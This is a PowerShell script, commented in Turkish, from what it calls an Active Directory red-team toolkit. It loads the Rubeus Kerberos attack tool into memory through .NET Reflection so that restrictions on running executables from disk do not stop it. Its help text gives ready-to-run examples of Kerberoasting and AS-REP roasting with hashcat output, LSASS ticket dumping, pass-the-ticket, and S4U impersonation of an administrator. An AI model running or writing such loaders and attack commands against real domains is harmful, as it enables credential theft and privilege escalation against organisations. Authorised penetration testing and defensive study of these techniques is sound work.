<#
.SYNOPSIS
    Rubeus.exe'yi PowerShell üzerinden in-memory çalıştırır.
    .NET Reflection kullanarak exe'yi diske yazmadan bellekte yükler.

.DESCRIPTION
    Bu script, Rubeus.exe'yi [System.Reflection.Assembly]::Load() ile
    belleğe yükler ve entry point'ini çağırır. Disk üzerinde exe
    çalıştırma kısıtlaması olan ortamlarda kullanılır.

    Desteklenen Rubeus komutları:
    - kerberoast      : SPN kayıtlı hesapların TGS ticket'larını çeker
    - asreproast      : Pre-auth gerektirmeyen hesapları hedefler
    - hash            : Parola hash'i hesaplar
    - tgtdeleg        : TGT delegation ile ticket çeker
    - monitor         : Yeni TGT'leri izler
    - harvest         : TGT'leri toplar
    - s4u             : S4U2Self/S4U2Proxy saldırıları
    - ptt             : Pass-the-ticket
    - dump            : LSASS'dan ticket dump
    - describe        : Ticket bilgilerini gösterir
    - createnetonly   : Yeni logon session oluşturur
    - renew           : TGT yeniler

.PARAMETER Command
    Rubeus'a geçirilecek komut string'i.
    Örnek: "kerberoast", "asreproast /format:hashcat", "hash /password:test"

.PARAMETER ExePath
    Rubeus.exe dosyasının yolu. Belirtilmezse script dizinindeki
    üst klasördeki Rubeus.exe kullanılır.

.EXAMPLE
    # Kerberoast saldırısı
    Invoke-Rubeus -Command "kerberoast"

.EXAMPLE
    # Hashcat formatında Kerberoast
    Invoke-Rubeus -Command "kerberoast /format:hashcat /outfile:hashes.txt"

.EXAMPLE
    # AS-REP Roasting
    Invoke-Rubeus -Command "asreproast /format:hashcat"

.EXAMPLE
    # Belirli bir kullanıcı için Kerberoast
    Invoke-Rubeus -Command "kerberoast /user:svc_mssql"

.EXAMPLE
    # TGT delegation
    Invoke-Rubeus -Command "tgtdeleg"

.EXAMPLE
    # S4U saldırısı
    Invoke-Rubeus -Command "s4u /user:MACHINE$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt"

.EXAMPLE
    # Farklı bir Rubeus.exe yolu belirt
    Invoke-Rubeus -Command "kerberoast" -ExePath "C:\tools\Rubeus.exe"

.NOTES
    Orijinal Araç: Rubeus by GhostPack (@harmj0y)
    Wrapper: AD Red Team PowerShell Toolkit
    Gereksinim: .NET Framework 4.0+
#>

function Invoke-Rubeus {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true, Position = 0, HelpMessage = "Rubeus komutu (örn: 'kerberoast', 'asreproast /format:hashcat')")]
        [string]$Command,

        [Parameter(Mandatory = $false, HelpMessage = "Rubeus.exe dosya yolu")]
        [string]$ExePath
    )

    # Exe yolunu belirle
    if (-not $ExePath) {
        $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
        $ExePath = Join-Path (Split-Path -Parent $scriptDir) "Rubeus.exe"
    }

    if (-not (Test-Path $ExePath)) {
        Write-Error "[!] Rubeus.exe bulunamadı: $ExePath"
        Write-Error "[!] -ExePath parametresi ile doğru yolu belirtin."
        return
    }

    Write-Host "[*] Rubeus.exe yükleniyor: $ExePath" -ForegroundColor Cyan

    try {
        # Binary'yi oku ve belleğe yükle
        $bytes = [System.IO.File]::ReadAllBytes($ExePath)
        $assembly = [System.Reflection.Assembly]::Load($bytes)
        Write-Host "[+] Assembly belleğe yüklendi: $($assembly.FullName)" -ForegroundColor Green

        # Argümanları parse et
        $args = $Command.Split(' ', [StringSplitOptions]::RemoveEmptyEntries)
        Write-Host "[*] Çalıştırılıyor: Rubeus.exe $Command" -ForegroundColor Cyan
        Write-Host ("-" * 60) -ForegroundColor DarkGray

        # Console output'u yakala
        $originalOut = [Console]::Out
        $stringWriter = New-Object System.IO.StringWriter
        [Console]::SetOut($stringWriter)

        try {
            # Entry point'i çağır
            $assembly.EntryPoint.Invoke($null, @(,[string[]]$args))
        }
        catch [System.Reflection.TargetInvocationException] {
            # Inner exception'ı kontrol et
            if ($_.Exception.InnerException) {
                Write-Warning "Rubeus exception: $($_.Exception.InnerException.Message)"
            }
        }
        finally {
            [Console]::SetOut($originalOut)
        }

        # Çıktıyı göster
        $output = $stringWriter.ToString()
        if ($output) {
            Write-Host $output
        }
        Write-Host ("-" * 60) -ForegroundColor DarkGray
        Write-Host "[+] Rubeus tamamlandı." -ForegroundColor Green
    }
    catch {
        Write-Error "[!] Hata: $($_.Exception.Message)"
        if ($_.Exception.InnerException) {
            Write-Error "[!] Detay: $($_.Exception.InnerException.Message)"
        }
    }
}

# Doğrudan çalıştırma desteği
if ($MyInvocation.InvocationName -ne '.') {
    if ($args.Count -gt 0) {
        Invoke-Rubeus -Command ($args -join ' ')
    }
}
